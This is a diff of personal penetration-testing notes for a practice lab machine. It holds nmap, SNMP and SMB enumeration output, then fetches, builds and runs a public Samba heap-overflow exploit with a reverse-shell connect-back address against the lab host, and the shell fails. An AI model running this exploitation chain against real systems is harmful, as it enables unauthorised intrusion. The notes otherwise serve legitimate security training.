@@ -225,7 +225,35 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-### SSH - 22
+```
+┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Heist]
+└─$ sudo nmap -p- 192.168.162.42                          
+[sudo] password for kali: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-28 19:36 EST
+Stats: 0:04:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 28.26% done; ETC: 19:52 (0:11:28 remaining)
+Stats: 0:07:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 46.71% done; ETC: 19:52 (0:08:28 remaining)
+Nmap scan report for 192.168.162.42
+Host is up (0.17s latency).
+Not shown: 65528 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+80/tcp    open  http
+139/tcp   open  netbios-ssn
+199/tcp   open  smux
+445/tcp   open  microsoft-ds
+60000/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 962.17 seconds
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Heist]
+└─$ 
+
+```
+
+## SSH - 22
 
 #### Test
 ```
@@ -248,10 +276,10 @@ Password:
 ```
 
 
-### SSH - 60000
+## SSH - 60000
 
 
-### Web - 80
+## Web - 80
 
 ### Nikto
 
@@ -292,9 +320,9 @@ Password:
 
 
 
-### 199/tcp   open     smux        syn-ack ttl 63 Linux SNMP multiplexer
+## 199/tcp Linux SNMP multiplexer
 
-### 445/tcp   open     netbios-ssn syn-ack ttl 63 Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
+## 445/tcp Samba smbd 3.0.14a-Debian 
 
 #### enum4linux
 
@@ -412,7 +440,7 @@ lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecate
         IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
         ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
 Reconnecting with SMB1 for workgroup listing.
-
+​445/tcp Samba smbd 3.0.14a-Debian 
         Server               Comment
         ---------            -------
         0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig
@@ -619,3 +647,357 @@ enum4linux complete on Thu Jan 13 07:13:16 2022
 
                                                   
 ```
+
+
+## UDP 161 SNMP
+```
+┌──(kali㉿kali)-[~]
+└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 192.168.162.42 -w 100                                           1 ⨯
+Scanning 1 hosts, 121 communities
+192.168.162.42 [public] Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
+192.168.162.42 [public] Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
+                                  
+┌──(kali㉿kali)-[~]
+└─$ snmp-check  192.168.162.42
+snmp-check v1.9 - SNMP enumerator
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+[+] Try to connect to 192.168.162.42:161 using SNMPv1 and community 'public'
+
+[*] System information:
+
+  Host IP address               : 192.168.162.42
+  Hostname                      : 0xbabe.local
+  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
+  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
+  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
+  Uptime snmp                   : 00:35:43.38
+  Uptime system                 : 00:35:02.77
+  System date                   : 2022-1-29 01:10:16.0
+
+[*] Network information:
+
+  IP forwarding enabled         : no
+  Default TTL                   : 64
+  TCP segments received         : 69234
+  TCP segments sent             : 69155
+  TCP segments retrans          : 0
+  Input datagrams               : 69735
+  Delivered datagrams           : 69735
+  Output datagrams              : 69519
+
+[*] Network interfaces:
+
+  Interface                     : [ up ] lo
+  Id                            : 1
+  Mac Address                   : :::::
+  Type                          : softwareLoopback
+  Speed                         : 10 Mbps
+  MTU                           : 16436
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ up ] eth0
+  Id                            : 2
+  Mac Address                   : 00:50:56:ba:bd:dc
+  Type                          : ethernet-csmacd
+  Speed                         : 100 Mbps
+  MTU                           : 1500
+  In octets                     : 4625368
+  Out octets                    : 4204446
+
+  Interface                     : [ down ] sit0
+  Id                            : 3
+  Mac Address                   : 00:00:00:00:bd:dc
+  Type                          : unknown
+  Speed                         : 0 Mbps
+  MTU                           : 1480
+  In octets                     : 0
+  Out octets                    : 0
+
+
+[*] Network IP:
+
+  Id                    IP Address            Netmask               Broadcast           
+  1                     127.0.0.1             255.0.0.0             0                   
+  2                     192.168.162.42        255.255.255.0         1                   
+
+[*] Routing information:
+
+  Destination           Next hop              Mask                  Metric              
+  0.0.0.0               192.168.162.254       0.0.0.0               1                   
+  192.168.162.0         0.0.0.0               255.255.255.0         0                   
+
+[*] TCP connections and listening ports:
+
+  Local address         Local port            Remote address        Remote port           State               
+  0.0.0.0               25                    0.0.0.0               0                     listen              
+  0.0.0.0               80                    0.0.0.0               0                     listen              
+  0.0.0.0               139                   0.0.0.0               0                     listen              
+  0.0.0.0               199                   0.0.0.0               0                     listen              
+  0.0.0.0               445                   0.0.0.0               0                     listen              
+
+[*] Listening UDP ports:
+
+  Local address         Local port          
+  0.0.0.0               137                 
+  0.0.0.0               138                 
+  0.0.0.0               161                 
+  192.168.162.42        137                 
+  192.168.162.42        138                 
+
+[*] Processes:
+
+  Id                    Status                Name                  Path                  Parameters          
+  1                     runnable              init                  init [2]                                  
+  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
+  3                     runnable              events/0              events/0                                  
+  4                     runnable              khelper               khelper                                   
+  5                     runnable              kacpid                kacpid                                    
+  99                    runnable              kblockd/0             kblockd/0                                 
+  109                   runnable              pdflush               pdflush                                   
+  110                   runnable              pdflush               pdflush                                   
+  111                   runnable              kswapd0               kswapd0                                   
+  112                   runnable              aio/0                 aio/0                                     
+  255                   runnable              kseriod               kseriod                                   
+  276                   runnable              scsi_eh_0             scsi_eh_0                                 
+  284                   runnable              khubd                 khubd                                     
+  348                   runnable              shpchpd_event         shpchpd_event                             
+  380                   runnable              kjournald             kjournald                                 
+  935                   runnable              vmmemctl              vmmemctl                                  
+  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                        
+  3774                  running               syslogd               /sbin/syslogd                             
+  3777                  runnable              klogd                 /sbin/klogd                               
+  3781                  runnable              clamd                 /usr/local/sbin/clamd                      
+  3783                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
+  3792                  runnable              inetd                 /usr/sbin/inetd                           
+  3796                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
+  3798                  runnable              smbd                  /usr/sbin/smbd        -D                  
+  3802                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
+  3804                  runnable              smbd                  /usr/sbin/smbd        -D                  
+  3809                  runnable              sshd                  /usr/sbin/sshd                            
+  3899                  runnable              atd                   /usr/sbin/atd                             
+  3902                  runnable              cron                  /usr/sbin/cron                            
+  3909                  runnable              apache                /usr/sbin/apache                          
+  3915                  runnable              getty                 /sbin/getty           38400 tty1          
+  3916                  runnable              getty                 /sbin/getty           38400 tty2          
+  3917                  runnable              getty                 /sbin/getty           38400 tty3          
+  3918                  runnable              getty                 /sbin/getty           38400 tty4          
+  3919                  runnable              getty                 /sbin/getty           38400 tty5          
+  3920                  runnable              getty                 /sbin/getty           38400 tty6          
+  3921                  runnable              apache                /usr/sbin/apache                          
+  3972                  runnable              apache                /usr/sbin/apache                          
+  3973                  runnable              apache                /usr/sbin/apache                          
+  3974                  runnable              apache                /usr/sbin/apache                          
+  3975                  runnable              apache                /usr/sbin/apache                          
+  3976                  runnable              sendmail-mta          sendmail: MTA: accepting connections                      
+  3978                  runnable              apache                /usr/sbin/apache                          
+
+[*] Storage information:
+
+  Description                   : ["Real Memory"]
+  Device id                     : [#<SNMP::Integer:0x000055bb4e5fb6d0 @value=2>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x000055bb4e5f9b28 @value=1024>]
+  Memory size                   : 250.82 MB
+  Memory used                   : 115.71 MB
+
+  Description                   : ["Swap Space"]
+  Device id                     : [#<SNMP::Integer:0x000055bb4e5f8ea8 @value=3>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x000055bb4e5f2eb8 @value=1024>]
+  Memory size                   : 203.91 MB
+  Memory used                   : 0 bytes
+
+  Description                   : ["/"]
+  Device id                     : [#<SNMP::Integer:0x000055bb4e5edda0 @value=4>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x000055bb4e5ec1d0 @value=4096>]
+  Memory size                   : 3.74 GB
+  Memory used                   : 765.73 MB
+
+  Description                   : ["/sys"]
+  Device id                     : [#<SNMP::Integer:0x000055bb4e5e3260 @value=5>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x000055bb4e5e1640 @value=4096>]
+  Memory size                   : 0 bytes
+  Memory used                   : 0 bytes
+
+
+[*] File system information:
+
+  Index                         : 1
+  Mount point                   : /
+  Remote mount point            : -
+  Access                        : 1
+  Bootable                      : 1
+
+[*] Device information:
+
+  Id                    Type                  Status                Descr               
+  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7371 16-Core Processor
+  1025                  unknown               running               network interface lo
+  1026                  unknown               running               network interface eth0
+  1027                  unknown               down                  network interface sit0
+  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
+  1552                  unknown               unknown               SCSI disk (/dev/sda)
+  3072                  unknown               unknown               Guessing that there's a floating point co-processor
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ 
+
+```
+
+
+# Exploits
+
+https://github.com/macha97/exploit-smb-3.0.20
+
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ searchsploit -m 7701                                                                                                                                            1 ⚙
+  Exploit: Samba < 3.0.20 - Remote Heap Overflow
+      URL: https://www.exploit-db.com/exploits/7701
+     Path: /usr/share/exploitdb/exploits/linux/remote/7701.txt
+File Type: C source, UTF-8 Unicode text
+
+Copied to: /tmp/7701.txt
+
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cat 7701.txt                                                                                                                                                    1 ⚙
+/***********************************************************************************/
+/* Samba < 3.0.20 heap overflow                                                    */
+/* per Debian 3.0.14a Debian e altre versioni                                      */
+/* per versionare il sorgente:                                                     */
+/* usare l'opzione DEBUG                                                           */
+/* usare free() dalla GOT (non funziona su Mandriva,RHEL e Fedora)                 */
+/* da qualche parte nel 3Â°/4Â° pacchetto di risposta dice la versione di Samba    */
+/* coded by zuc@hack.it                                                    */
+/***********************************************************************************/
+#define VERSN 25
+struct versions vers[VERSN] =
+{
+{"Debian 3.1 r0 X restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r0 X",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r0 noX restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r0 noX",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r0a X 1st",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r0a noX restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r0a noX",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r1 noX restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r1 noX",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r2 noX restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r2 noX",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r3 noX restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r3 noX",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r4 noX restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r4 noX",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r5 noX restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r5 noX",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r6a noX restart",0x0827c000,0x0837f000,30*1024},
+{"Debian 3.1 r6a noX",0x0827c000,0x0837f000,30*1024},
+{"Slackware 10.0 restart",0x0827c000,0x0837f000,30*1024},
+{"Slackware 10.0",0x0827c000,0x0837f000,30*1024},
+{"Mandrake 10.1 noX",0x80380000,0x8045b000,30*1024},
+{"Mandrake 10.1 X Kde",0x80380000,0x8045b000,30*1024},
+{"Samba 3.0.x DEBUG",0x80380000,0x8045b000,30*1024}
+};
+
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7701.zip (2009-lsa.zip)
+
+# milw0rm.com [2009-01-08]                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7701.zip                                                                1 ⚙
+--2022-01-28 19:55:19--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7701.zip
+Resolving github.com (github.com)... 20.205.243.166
+Connecting to github.com (github.com)|20.205.243.166|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/7701.zip [following]
+--2022-01-28 19:55:19--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/7701.zip
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8112 (7.9K) [application/zip]
+Saving to: ‘7701.zip’
+
+7701.zip                                  100%[=====================================================================================>]   7.92K  --.-KB/s    in 0s      
+
+2022-01-28 19:55:19 (69.2 MB/s) - ‘7701.zip’ saved [8112/8112]
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ file 7701.zip                                                                                                                                                   1 ⚙
+7701.zip: Zip archive data, at least v2.0 to extract
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ dtrx 7701.                                                                                                                                                      1 ⚙
+dtrx: ERROR: 7701.: No such file or directory
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ dtrx 7701.zip                                                                                                                                               1 ⨯ 1 ⚙
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cd 7701                                                                                                                                                         1 ⚙
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/7701]
+└─$ ls                                                                                                                                                              1 ⚙
+build  frontend.c  functions.c  in_frontend.h  lsa.c
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/7701]
+└─$ ./build                                                                                                                                                         1 ⚙
+frontend.c: In function ‘main’:
+frontend.c:33:1: warning: implicit declaration of function ‘usage’ [-Wimplicit-function-declaration]
+   33 | usage();
+      | ^~~~~
+frontend.c:34:1: warning: implicit declaration of function ‘LSA’ [-Wimplicit-function-declaration]
+   34 | LSA(argv[1],argv[2],argv[3],atoi(argv[4]),ax);
+      | ^~~
+functions.c: In function ‘hextoint’:
+functions.c:531:3: warning: implicit declaration of function ‘free’ [-Wimplicit-function-declaration]
+  531 |   free(mstr);
+      |   ^~~~
+functions.c:4:1: note: include ‘<stdlib.h>’ or provide a declaration of ‘free’
+    3 | #include "in_frontend.h"
+  +++ |+#include <stdlib.h>
+    4 | 
+functions.c:531:3: warning: incompatible implicit declaration of built-in function ‘free’ [-Wbuiltin-declaration-mismatch]
+  531 |   free(mstr);
+      |   ^~~~
+functions.c:531:3: note: include ‘<stdlib.h>’ or provide a declaration of ‘free’
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/7701]
+└─$ ls                                                                                                                                                              1 ⚙
+build  frontend  frontend.c  functions.c  in_frontend.h  lsa.c
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/7701]
+└─$ ./frontend                                                                                                                                                      1 ⚙
+
+Samba < 3.0.20 Zuc
+by Zuc (zuc@hack.it)
+
+Usage: <victim-host> <connectback-ip> <connectback port> <version>
+
+Sample: LSA www.victim.com 80.81.82.83 31337 1
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/7701]
+└─$ ./frontend 192.168.162.42 192.168.49.162 443 1                                                                                                                  1 ⚙
+
+Samba < 3.0.20 Zuc
+by Zuc (zuc@hack.it)
+OS: Debian 3.1 r0 X
+count: 1
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp/7701]
+└─$
+```
+
+NO reverse shell created
+
+
+
+# Others
